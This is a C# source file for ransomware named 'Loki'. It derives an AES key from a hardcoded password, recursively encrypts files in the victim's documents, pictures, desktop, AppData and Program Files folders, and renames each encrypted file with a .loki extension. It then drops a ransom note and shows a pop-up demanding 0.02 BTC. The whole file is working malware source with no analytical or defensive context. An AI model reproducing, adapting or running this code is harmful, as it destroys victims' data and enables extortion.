namespace loki.loki.Ransomware
{
    using System;
    using System.Diagnostics;
    using System.IO;
    using System.Security.Cryptography;
    using System.Text;
    using System.Threading;
    using System.Windows.Forms;
    using Utilies.CryptoGrafy;

    internal partial class RansomwareCrypt
    {
        public static string PasswordEncrypt = "ugsojfsoejoigjwpfdsfmisofjksepfselfs[gkreopf";

        public static byte[] RidjinEncrypt(byte[] byte_0)
        {
            byte[] result = null;
            using (var memoryStream = new MemoryStream())
            using (var rijndaelManaged = new RijndaelManaged())
            {
                rijndaelManaged.KeySize = 256;
                rijndaelManaged.BlockSize = 128;
                var rfc2898DeriveBytes = new Rfc2898DeriveBytes(Encoding.ASCII.GetBytes(PasswordEncrypt), Encoding.ASCII.GetBytes(PasswordEncrypt), 1000);
                rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
                rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
                rijndaelManaged.Mode = CipherMode.CBC;
                using (var cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
                {
                    cryptoStream.Write(byte_0, 0, byte_0.Length);
                }
                result = memoryStream.ToArray();
            }
            return result;
        }

        public static void EncryptFiles(string string_1)
        {
            try
            {
                try
                {
                    if (new FileInfo(string_1).Length > 4096)
                    {
                        if (new FileInfo(string_1).Length <= 30000000)
                        {
                            byte[] array = new byte[8192];
                            using (var binaryReader = new BinaryReader(File.Open(string_1, FileMode.Open)))
                            {
                                byte[] array2 = RidjinEncrypt(binaryReader.ReadBytes(4096));
                                Array.Copy(array2, array, array2.Length);
                            }
                            using (var binaryWriter = new BinaryWriter(File.Open(string_1, FileMode.Open)))
                            {
                                binaryWriter.Write(array);
                            }
                            File.Move(string_1, $"{string_1}.loki");
                        }
                    }
                    else
                    {
                        byte[] bytes = RidjinEncrypt(File.ReadAllBytes(string_1));
                        File.WriteAllBytes(string_1, bytes);
                        File.Move(string_1, $"{string_1}.loki");
                    }
                }
                catch (Exception)
                {
                    FileAttributes fileAttributes = File.GetAttributes(string_1);
                    if ((fileAttributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
                    {
                        fileAttributes = FileAttrib(fileAttributes, FileAttributes.ReadOnly);
                        File.SetAttributes(string_1, fileAttributes);
                    }
                    if (new FileInfo(string_1).Length <= 4096L)
                    {
                        byte[] bytes2 = RidjinEncrypt(File.ReadAllBytes(string_1));
                        File.WriteAllBytes(string_1, bytes2);
                        File.Move(string_1, $"{string_1}.loki");
                    }
                    else if (new FileInfo(string_1).Length <= 30000000L)
                    {
                        byte[] buffer = new byte[8192];
                        using (var binaryReader2 = new BinaryReader(File.Open(string_1, FileMode.Open)))
                        {
                            buffer = RidjinEncrypt(binaryReader2.ReadBytes(4096));
                        }
                        using (var binaryWriter2 = new BinaryWriter(File.Open(string_1, FileMode.Open)))
                        {
                            binaryWriter2.Write(buffer);
                        }
                        File.Move(string_1, $"{string_1}.loki");
                    }
                }
            }
            catch (Exception) { }
        }

        public static FileAttributes FileAttrib(FileAttributes fileAttributes_0, FileAttributes fileAttributes_1) => fileAttributes_0 & ~fileAttributes_1;

        public static void GetFile(string string_1)
        {
            try
            {
                foreach (string v in Directory.GetFiles(string_1))
                {
                    if (!Path.GetExtension(v).Contains("loki"))
                    {
                        EncryptFiles(v);
                    }
                }
                foreach (string v1 in Directory.GetDirectories(string_1))
                {
                    GetFile(v1);
                }
            }
            catch (Exception) { }
        }

        internal static void Start()
        {
            if (!File.Exists($"{Environment.GetEnvironmentVariable("ProgramData")}\\trig"))
            {
                string[] array = new string[]
                {
                   Environment.GetFolderPath(Environment.SpecialFolder.Recent),
                   Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                   Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
                   Environment.GetFolderPath(Environment.SpecialFolder.MyMusic),
                   Environment.GetFolderPath(Environment.SpecialFolder.MyVideos),
                   Environment.GetFolderPath(Environment.SpecialFolder.Personal),
                   Environment.GetFolderPath(Environment.SpecialFolder.Favorites),
                   Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments),
                   Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures),
                   Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic),
                   Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos),
                   Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory),
                   Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory),
                   Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
                   Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
                   Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                   Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
                   Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86),
                   Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)
                };

                foreach (string v in array)
                {
                    GetFile(v);
                }

            }
            File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory) + "\\HowToDecrypt.txt", "IMPORTANT INFORMATION!!!!\nAll your files are encrypted with Loki stealer:" + crypt.AESDecript(Settings.Stealer_version) + "\nTo Decrypt: \n - Send 0.02 BTC to: " + crypt.AESDecript(Settings.bitcoin_keshel) + "\n- Follow All Steps", Encoding.UTF8);
            Thread.Sleep(2000);
            MessageBox.Show($"IMPORTANT INFORMATION!!!!\nAll your files are encrypted with Loki stealer: {crypt.AESDecript(Settings.Stealer_version)}\nTo Decrypt: \n - Send 0.02 BTC to: {crypt.AESDecript(Settings.bitcoin_keshel)}\n - Follow All Steps");
            Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory) + "\\HowToDecrypt.txt");
        }
    }
}



